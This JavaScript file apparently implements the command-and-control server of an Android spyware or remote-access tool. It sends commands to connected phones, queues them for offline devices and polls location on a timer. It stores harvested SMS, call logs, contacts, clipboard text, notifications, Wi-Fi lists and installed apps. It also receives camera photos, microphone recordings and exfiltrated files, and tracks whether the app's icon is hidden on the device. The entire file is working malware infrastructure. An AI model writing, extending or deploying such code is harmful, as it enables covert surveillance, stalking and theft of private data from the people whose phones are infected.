const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const config = require('../config/config');
const db = require('../database/db');
const { logger } = require('../logs/logs');
const { ensureDir } = require('../utils/ensureDir');

// Client Manager class
class ClientManager {
    constructor() {
        this.sockets = {};
        this.dbs = {};
        this.gpsTimers = {};
        this.transfers = {};
        logger.info('Client manager initialized');
    }

    // Connect client
    connect(socket, id, data) {
        try {
            this.sockets[id] = socket;
            const client = db.main.get('clients').find({ id });
            const now = new Date().toISOString();

            if (client.value()) {
                client.assign({
                    lastSeen: now,
                    online: true,
                    reconnectCount: (client.value().reconnectCount || 0) + 1,
                    ...data
                }).write();
            } else {
                db.main.get('clients').push({
                    id,
                    firstSeen: now,
                    lastSeen: now,
                    online: true,
                    reconnectCount: 0,
                    ...data
                }).write();
            }

            logger.clientConnected(id, data.ip, data.device);
            this.setupHandlers(id);
            this.runQueue(id);
            this.restoreGpsPolling(id);
        } catch (e) {
            logger.systemError('Client connect failed', e);
        }
    }

    // Disconnect client
    disconnect(id) {
        try {
            db.main.get('clients').find({ id }).assign({
                online: false,
                lastSeen: new Date().toISOString()
            }).write();

            delete this.sockets[id];
            this.clearGps(id);

            // Clean transfers
            Object.keys(this.transfers).forEach(tid => {
                if (tid.startsWith(id)) delete this.transfers[tid];
            });

            logger.clientDisconnected(id);
        } catch (e) {
            logger.systemError('Client disconnect failed', e);
        }
    }

    // Get client database
    getDb(id) {
        if (!this.dbs[id]) {
            this.dbs[id] = db.client(id);
        }
        return this.dbs[id];
    }

    // Get clients list
    online() { return db.main.get('clients').filter({ online: true }).value(); }
    offline() { return db.main.get('clients').filter({ online: false }).value(); }
    all() { return db.main.get('clients').value(); }
    get(id) { return db.main.get('clients').find({ id }).value(); }

    // Send command
    send(id, cmd, params = {}, cb = () => {}) {
        try {
            const client = this.get(id);
            if (!client) {
                logger.commandFailed(id, cmd, 'Client not found');
                return cb('Client not found');
            }

            params.type = cmd;
            params.timestamp = Date.now();

            if (this.sockets[id]) {
                this.sockets[id].emit('order', params);
                logger.commandSent(id, cmd, params);
                cb(null, 'Sent');
            } else {
                this.queue(id, params, cb);
            }
        } catch (e) {
            logger.commandFailed(id, cmd, e.message);
            cb(e.message);
        }
    }

    // Queue command
    queue(id, params, cb) {
        try {
            const cdb = this.getDb(id);
            if (!cdb) return cb('Database unavailable');

            const existing = cdb.get('queue').find({ type: params.type }).value();
            if (existing) return cb('Already queued');

            params.uid = Date.now();
            cdb.get('queue').push(params).write();
            logger.commandQueued(id, params.type);
            cb(null, 'Queued');
        } catch (e) {
            cb(e.message);
        }
    }

    // Run queued commands
    runQueue(id) {
        try {
            const cdb = this.getDb(id);
            if (!cdb) return;

            const queue = cdb.get('queue').value() || [];
            queue.forEach(cmd => {
                if (this.sockets[id]) {
                    this.sockets[id].emit('order', cmd);
                    cdb.get('queue').remove({ uid: cmd.uid }).write();
                }
            });
        } catch (e) {
            logger.systemError('Run queue failed', e);
        }
    }

    // GPS polling
    setGps(id, interval) {
        try {
            this.clearGps(id);
            const cdb = this.getDb(id);

            if (interval > 0 && this.sockets[id]) {
                this.gpsTimers[id] = setInterval(() => {
                    this.send(id, config.msg.location, {});
                }, interval * 1000);

                if (cdb) cdb.set('gpsInterval', interval).write();
                logger.info(`GPS polling started for ${id} (${interval}s)`, 'client');
            } else if (cdb) {
                cdb.set('gpsInterval', 0).write();
            }

            return true;
        } catch (e) {
            return false;
        }
    }

    clearGps(id) {
        if (this.gpsTimers[id]) {
            clearInterval(this.gpsTimers[id]);
            delete this.gpsTimers[id];
        }
    }

    restoreGpsPolling(id) {
        try {
            const cdb = this.getDb(id);
            const interval = cdb?.get('gpsInterval').value();
            if (interval > 0) this.setGps(id, interval);
        } catch (e) {}
    }

    // Get page data
    getData(id, page) {
        try {
            const cdb = this.getDb(id);
            const client = this.get(id);
            if (!client) return null;

            const pages = {
                info: () => ({ client, deviceInfo: cdb?.get('deviceInfo').value() }),
                sms: () => ({ list: cdb?.get('sms').value() || [] }),
                calls: () => ({ list: cdb?.get('calls').value() || [] }),
                contacts: () => ({ list: cdb?.get('contacts').value() || [] }),
                wifi: () => ({ list: cdb?.get('wifi').value() || [] }),
                clipboard: () => ({ list: (cdb?.get('clipboard').value() || []).slice(-100) }),
                notifications: () => ({ list: (cdb?.get('notifications').value() || []).slice(-100) }),
                permissions: () => ({ list: cdb?.get('permissions').value() || [] }),
                apps: () => ({ list: cdb?.get('apps').value() || [] }),
                gps: () => ({ list: (cdb?.get('gps').value() || []).slice(-50), interval: cdb?.get('gpsInterval').value() || 0 }),
                files: () => ({ list: cdb?.get('files').value() || [], path: cdb?.get('currentPath').value() || '' }),
                downloads: () => ({ list: cdb?.get('downloads').value() || [] }),
                camera: () => ({ cameras: cdb?.get('cameras').value() || [], photos: (cdb?.get('photos').value() || []).slice(-50) }),
                mic: () => ({ list: (cdb?.get('recordings').value() || []).slice(-50) }),
                fason: () => ({ hidden: cdb?.get('fasonHidden').value() || false })
            };

            return pages[page] ? pages[page]() : null;
        } catch (e) {
            return null;
        }
    }

    // Setup socket handlers
    setupHandlers(id) {
        const socket = this.sockets[id];
        const cdb = this.getDb(id);
        if (!socket || !cdb) return;

        // Disconnect
        socket.on('disconnect', (reason) => {
            logger.info(`Client ${id} disconnected: ${reason}`, 'client');
            this.disconnect(id);
        });

        // Pong
        socket.on('pong', () => {
            db.main.get('clients').find({ id }).assign({ lastSeen: new Date().toISOString() }).write();
        });

        // SMS
        socket.on(config.msg.sms, (data) => {
            if (data.smslist) {
                cdb.set('sms', data.smslist.slice(0, 500)).write();
                logger.dataReceived(id, 'SMS', data.smslist.length);
            }
        });

        // Calls
        socket.on(config.msg.calls, (data) => {
            if (data.callsList) {
                cdb.set('calls', data.callsList.slice(0, 500)).write();
                logger.dataReceived(id, 'calls', data.callsList.length);
            }
        });

        // Contacts
        socket.on(config.msg.contacts, (data) => {
            if (data.contactsList) {
                cdb.set('contacts', data.contactsList).write();
                logger.dataReceived(id, 'contacts', data.contactsList.length);
            }
        });

        // WiFi
        socket.on(config.msg.wifi, (data) => {
            if (data.networks) {
                cdb.set('wifi', data.networks).write();
                logger.dataReceived(id, 'WiFi', data.networks.length);
            }
        });

        // Clipboard
        socket.on(config.msg.clipboard, (data) => {
            if (data.text) {
                const list = cdb.get('clipboard').value() || [];
                if (list.length >= 200) cdb.set('clipboard', list.slice(-199)).write();
                cdb.get('clipboard').push({ text: data.text, time: new Date().toISOString() }).write();
                logger.dataReceived(id, 'clipboard');
            }
        });

        // Notifications
        socket.on(config.msg.notification, (data) => {
            const list = cdb.get('notifications').value() || [];
            if (list.length >= 200) cdb.set('notifications', list.slice(-199)).write();
            cdb.get('notifications').push({ ...data, time: new Date().toISOString() }).write();
            logger.dataReceived(id, 'notification');
        });

        // Permissions
        socket.on(config.msg.permissions, (data) => {
            if (data.permissions) {
                cdb.set('permissions', data.permissions).write();
                logger.dataReceived(id, 'permissions', data.permissions.length);
            }
        });

        // Apps
        socket.on(config.msg.apps, (data) => {
            if (data.apps) {
                cdb.set('apps', data.apps).write();
                logger.dataReceived(id, 'apps', data.apps.length);
            }
        });

        // Location
        socket.on(config.msg.location, (data) => {
            if (data.latitude) {
                const list = cdb.get('gps').value() || [];
                if (list.length >= 100) cdb.set('gps', list.slice(-99)).write();
                cdb.get('gps').push({ ...data, time: new Date().toISOString() }).write();
                logger.dataReceived(id, 'GPS');
            }
        });

        // Files
        socket.on(config.msg.files, (data) => this.handleFiles(id, data));

        // Camera
        socket.on(config.msg.camera, (data) => this.handleCamera(id, data));

        // Mic
        socket.on(config.msg.mic, (data) => this.handleMic(id, data));

        // Fason Manager
        socket.on(config.msg.fasonManager, (data) => {
            if (data.success) {
                cdb.set('fasonHidden', data.hidden || false).write();
            }
            logger.dataReceived(id, 'fasonManager', data.action || 'status');
        });

        // Device Info
        socket.on(config.msg.deviceInfo, (data) => {
            if (data.success) {
                cdb.set('deviceInfo', data).write();
                logger.dataReceived(id, 'deviceInfo');
            }
        });

        // Check Permission Response
        socket.on(config.msg.checkPerm, (data) => {
            if (data.permission) {
                logger.dataReceived(id, 'checkPerm', `${data.permission}: ${data.allowed}`);
            }
        });
    }

    // Handle file operations
    handleFiles(id, data) {
        const cdb = this.getDb(id);
        if (!cdb) return;

        try {
            if (data.type === 'list') {
                cdb.set('files', data.list || []).write();
                cdb.set('currentPath', data.path || '').write();
                logger.dataReceived(id, 'file list', data.list?.length || 0);
            } else if (data.type === 'download' && data.buffer) {
                this.saveFile(id, data.name, data.buffer, 'downloads', data.size);
            } else if (data.type === 'download_start') {
                const tid = `${id}_${data.transferId}`;
                this.transfers[tid] = {
                    id: data.transferId,
                    name: data.name,
                    path: data.path || '',
                    chunks: new Map(),
                    receivedChunks: 0,
                    totalChunks: data.totalChunks || 0,
                    totalSize: data.totalSize || 0,
                    startTime: Date.now()
                };
                logger.info(`File transfer started: ${data.name} from ${id}`, 'file');
            } else if (data.type === 'download_chunk') {
                const tid = `${id}_${data.transferId}`;
                const t = this.transfers[tid];
                if (t && t.chunks instanceof Map && !t.chunks.has(data.chunkIndex)) {
                    t.chunks.set(data.chunkIndex, data.chunkData);
                    t.receivedChunks++;
                }
            } else if (data.type === 'download_end') {
                const tid = `${id}_${data.transferId}`;
                const t = this.transfers[tid];
                if (!t) return;

                // Assemble chunks
                let assembled = '';
                for (let i = 0; i < (t.totalChunks || t.chunks.size); i++) {
                    const chunk = t.chunks.get(i);
                    if (chunk) assembled += chunk;
                }

                if (assembled.length > 0) {
                    this.saveFile(id, t.name, assembled, 'downloads', t.totalSize);
                }

                delete this.transfers[tid];
            } else if (data.type === 'error' && data.transferId) {
                delete this.transfers[`${id}_${data.transferId}`];
            }
        } catch (e) {
            logger.systemError('Files handler failed', e);
        }
    }

    // Handle camera
    handleCamera(id, data) {
        const cdb = this.getDb(id);
        if (!cdb) return;

        try {
            if (data.camList && data.list) {
                cdb.set('cameras', data.list).write();
                cdb.set('cameraPermission', data.hasPermission).write();
                logger.dataReceived(id, 'camera list', data.list?.length || 0);
            } else if (data.image && data.buffer) {
                const ts = data.timestamp || Date.now();
                this.saveFile(id, `cam${data.cameraId}_${ts}.jpg`, data.buffer, 'photos', data.size);
            }
        } catch (e) {
            logger.systemError('Camera handler failed', e);
        }
    }

    // Handle mic
    handleMic(id, data) {
        try {
            if (data.file && data.buffer) {
                this.saveFile(id, data.name || `mic_${Date.now()}.mp4`, data.buffer, 'recordings', data.size);
            }
        } catch (e) {
            logger.systemError('Mic handler failed', e);
        }
    }

    // Save file
    saveFile(id, name, buffer, type, size = null) {
        const dirs = { photos: config.photosPath, recordings: config.recordingsPath, downloads: config.downloadsPath };
        const dir = dirs[type] || config.downloadsPath;
        const hash = crypto.createHash('md5').update(Date.now().toString()).digest('hex').slice(0, 10);
        const ext = path.extname(name) || '.bin';
        const filename = `${hash}${ext}`;
        const filepath = path.join(dir, filename);

        try {
            ensureDir(dir);

            const data = typeof buffer === 'string' ? Buffer.from(buffer, 'base64') : buffer;
            if (!data || data.length === 0) return;

            fs.writeFileSync(filepath, data);

            const cdb = this.getDb(id);
            if (cdb) {
                const listKey = type;
                const list = cdb.get(listKey).value() || [];

                // Keep last 100
                if (list.length >= 100) {
                    list.slice(0, list.length - 99).forEach(item => {
                        try {
                            const oldPath = path.join(dir, path.basename(item.file));
                            if (fs.existsSync(oldPath)) fs.unlinkSync(oldPath);
                        } catch (e) {}
                    });
                    cdb.set(listKey, list.slice(-99)).write();
                }

                cdb.get(listKey).push({
                    name,
                    file: `/${type}/${filename}`,
                    time: new Date().toISOString(),
                    size: size || data.length
                }).write();
            }

            logger.fileSaved(id, name, type);
        } catch (e) {
            logger.fileSaveFailed(id, name, e.message);
        }
    }

    // Cleanup stale transfers
    cleanupStaleTransfers(maxAge = 600000) {
        const now = Date.now();
        Object.entries(this.transfers).forEach(([id, t]) => {
            if (t.startTime && now - t.startTime > maxAge) {
                delete this.transfers[id];
            }
        });
    }

    // Cleanup old clients
    cleanup(maxAge = 2592000000) {
        const now = Date.now();
        db.main.get('clients').value().forEach(client => {
            if (client.lastSeen && !client.online) {
                const lastSeen = new Date(client.lastSeen).getTime();
                if (now - lastSeen > maxAge) {
                    db.main.get('clients').remove({ id: client.id }).write();
                    const file = path.join(config.dbPath, 'clients', `${client.id}.json`);
                    if (fs.existsSync(file)) fs.unlinkSync(file);
                    logger.info(`Cleaned up stale client: ${client.id}`, 'system');
                }
            }
        });
    }
}

module.exports = new ClientManager();
